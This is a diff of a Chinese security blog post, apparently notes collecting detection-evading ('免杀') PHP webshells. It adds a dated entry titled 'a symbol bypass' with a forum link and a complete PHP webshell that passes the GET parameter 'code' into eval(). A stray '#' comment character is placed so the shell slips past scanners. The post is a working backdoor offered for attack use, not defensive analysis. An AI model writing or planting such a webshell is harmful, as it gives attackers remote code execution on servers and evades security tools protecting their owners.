@@ -4,13 +4,31 @@ date: 2019-08-12T21:10:02+08:00
 lastmod: 2019-08-12T21:57:02+08:00
 draft: false
 tags: ['bypass']
-categories: ['渗透测试']
+categories: ['bypass']
 comment: true
 ---
 
 准备写一个长期更新的免杀webshell总结
 
 <!--more-->
+
+2019-10-12
+
+一个符号bypass
+
+https://forum.90sec.com/t/topic/513/1
+
+```php
+<?php
+function test($name){#
+    eval($name);
+}
+
+test($_GET['code']);
+?>
+```
+
+
 
 2019-08-15
 
